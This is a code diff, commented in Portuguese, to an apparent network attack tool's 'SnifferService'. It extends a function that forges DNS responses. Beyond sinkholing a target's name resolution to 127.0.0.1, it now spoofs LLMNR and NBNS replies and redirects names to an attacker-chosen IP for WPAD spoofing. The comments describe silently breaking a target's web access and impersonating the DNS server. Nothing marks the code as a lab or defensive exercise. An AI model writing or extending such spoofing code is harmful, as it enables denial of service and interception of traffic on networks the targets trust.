@@ -512,23 +512,33 @@ func (s *SnifferService) DeactivateBlackHole(targetIPs []string) {
 	}
 }
 
-// forgeDNSResponse forja uma resposta DNS falsa apontando qualquer domínio para 127.0.0.1.
-// Usado pelo modo DNS Sinkholing para silenciosamente destruir a resolução de nomes do alvo.
-// O alvo mantém o ícone de WiFi conectado, mas nenhum site abre.
-func (s *SnifferService) forgeDNSResponse(handle *pcap.Handle, pktData []byte, myMAC, targetMAC net.HardwareAddr) {
+// forgeDNSResponse forja uma resposta DNS falsa apontando qualquer domínio para um IP específico.
+// Usado pelo modo DNS Sinkholing (127.0.0.1) e WPAD Spoofing (IP Local).
+func (s *SnifferService) forgeDNSResponse(handle *pcap.Handle, pktData []byte, myMAC, targetMAC net.HardwareAddr, sinkIPStr string) {
 	pkt := gopacket.NewPacket(pktData, layers.LayerTypeEthernet, gopacket.Default)
 
 	ipv4Layer := pkt.Layer(layers.LayerTypeIPv4)
 	udpLayer := pkt.Layer(layers.LayerTypeUDP)
-	dnsLayer := pkt.Layer(layers.LayerTypeDNS)
 
-	if ipv4Layer == nil || udpLayer == nil || dnsLayer == nil {
+	if ipv4Layer == nil || udpLayer == nil {
 		return
 	}
 
 	ipv4, _ := ipv4Layer.(*layers.IPv4)
 	udp, _ := udpLayer.(*layers.UDP)
-	dns, _ := dnsLayer.(*layers.DNS)
+
+	var dns *layers.DNS
+	dnsLayer := pkt.Layer(layers.LayerTypeDNS)
+	if dnsLayer != nil {
+		dns, _ = dnsLayer.(*layers.DNS)
+	} else {
+		// Força o decode manual para portas não-padrão como 5355 (LLMNR) e 137 (NBNS)
+		var manualDNS layers.DNS
+		if err := manualDNS.DecodeFromBytes(udp.Payload, gopacket.NilDecodeFeedback); err != nil {
+			return
+		}
+		dns = &manualDNS
+	}
 
 	if dns.OpCode != layers.DNSOpCodeQuery || len(dns.Questions) == 0 {
 		return
@@ -541,10 +551,20 @@ func (s *SnifferService) forgeDNSResponse(handle *pcap.Handle, pktData []byte, m
 		EthernetType: layers.EthernetTypeIPv4,
 	}
 
+	respSrcIP := ipv4.DstIP
+	// Se a requisição foi multicast (LLMNR - 224.0.0.252) ou broadcast (NBNS - .255),
+	// a resposta deve obrigatoriamente vir do nosso IP unicast, senão o SO do alvo descarta o pacote.
+	if ipv4.DstIP.IsMulticast() || ipv4.DstIP[len(ipv4.DstIP)-1] == 255 {
+		parsedSink := net.ParseIP(sinkIPStr).To4()
+		if parsedSink != nil {
+			respSrcIP = parsedSink
+		}
+	}
+
 	ip := layers.IPv4{
 		Version:  4,
 		TTL:      64,
-		SrcIP:    ipv4.DstIP, // Finge ser o servidor DNS
+		SrcIP:    respSrcIP,  // Nosso IP para LLMNR/NBNS, ou IP do DNS original
 		DstIP:    ipv4.SrcIP, // Para o alvo
 		Protocol: layers.IPProtocolUDP,
 	}
@@ -555,8 +575,11 @@ func (s *SnifferService) forgeDNSResponse(handle *pcap.Handle, pktData []byte, m
 	}
 	respUDP.SetNetworkLayerForChecksum(&ip)
 
-	// Monta a resposta DNS com o domínio apontando para 127.0.0.1
-	sinkIP := net.ParseIP("127.0.0.1").To4()
+	// Monta a resposta DNS com o domínio apontando para o IP alvo
+	sinkIP := net.ParseIP(sinkIPStr).To4()
+	if sinkIP == nil {
+		sinkIP = net.ParseIP("127.0.0.1").To4()
+	}
 	dnsResp := layers.DNS{
 		ID:           dns.ID,
 		QR:           true,
